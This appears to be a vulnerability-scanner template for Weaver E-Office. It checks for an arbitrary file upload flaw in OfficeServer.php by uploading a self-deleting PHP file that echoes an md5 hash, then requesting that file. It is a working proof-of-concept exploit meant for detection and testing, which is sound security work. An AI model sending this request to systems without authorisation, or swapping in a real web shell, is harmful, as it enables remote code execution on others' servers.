id: weaver-office-server-file-upload
brief:
    title: OA E-Office OfficeServer.php Arbitrary File Upload
    by: SleepingBag945
    level: critical
    about: OA E-Office OfficeServer.php has an arbitrary file upload vulnerability. Attackers can obtain sensitive information on the server through the vulnerability.
    label:
        - weaver
        - e-office
        - oa
        - rce
        - intrusive
        - fileupload
        - vuln
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/eoffice10/server/public/iWebOffice2015/OfficeServer.php'
      head:
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLpoiBFy4ANA8daew
      body: |-
        ------WebKitFormBoundaryLpoiBFy4ANA8daew
        Content-Disposition: form-data;name="FileData";filename="{{filename}}.php"
        Content-Type: application/octet-stream

        <?php echo md5("{{string}}");unlink(__FILE__);?>

        ------WebKitFormBoundaryLpoiBFy4ANA8daew
        Content-Disposition: form-data;name="FormData"

        {'USERNAME':'admin','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'{{filename}}.php'}
        ------WebKitFormBoundaryLpoiBFy4ANA8daew--
      signs:
        - "on": word
          has:
            - '{{md5(string)}}'
          in: body_2
          need: all
        - "on": status
          status:
            - 200
    - verb: GET
      to:
        - '{{BaseURL}}/eoffice10/server/public/iWebOffice2015/Document/{{filename}}.php'
      signs:
        - "on": word
          has:
            - '{{md5(string)}}'
          in: body_2
          need: all
        - "on": status
          status:
            - 200
